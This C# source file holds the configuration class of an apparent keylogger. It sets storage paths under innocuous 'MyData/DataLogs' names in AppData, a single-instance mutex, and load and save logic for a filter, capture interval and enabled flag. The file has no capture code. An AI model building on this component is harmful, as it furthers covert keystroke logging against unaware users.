using System;
using System.Collections.Generic;
using System.IO;

namespace Params;

public class KeylogParams
{
	public static string KeylogConfFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyData", "DataLogs.conf");

	public static string OfflineSaveFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyData", "DataLogs_keylog_offline.txt");

	public static string OnlineSaveFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyData", "DataLogs_keylog_online.txt");

	public const string KeylogMutexString = "OfflineKeylogger";

	public string filter { get; set; } = string.Empty;


	public int interval { get; set; } = 5;


	public bool isEnabled { get; set; }

	public List<string> filters
	{
		get
		{
			try
			{
				return new List<string>(filter.Split(new char[1] { ' ' }, StringSplitOptions.RemoveEmptyEntries));
			}
			catch
			{
			}
			return new List<string>();
		}
	}

	public string content
	{
		get
		{
			return $"{filter}\n{interval}\n{isEnabled}";
		}
		set
		{
			try
			{
				string[] array = value.Split('\n');
				filter = array[0];
				interval = Convert.ToInt32(array[1]);
				if (interval == 0)
				{
					interval = 5;
				}
				isEnabled = Convert.ToBoolean(array[2]);
			}
			catch
			{
				filter = string.Empty;
				interval = 5;
				isEnabled = false;
			}
		}
	}

	public void LoadFromFile()
	{
		if (File.Exists(KeylogConfFile))
		{
			content = File.ReadAllText(KeylogConfFile);
		}
		else
		{
			SaveToFile();
		}
	}

	public void SaveToFile()
	{
		File.Delete(KeylogConfFile);
		File.AppendAllText(KeylogConfFile, content);
	}
}
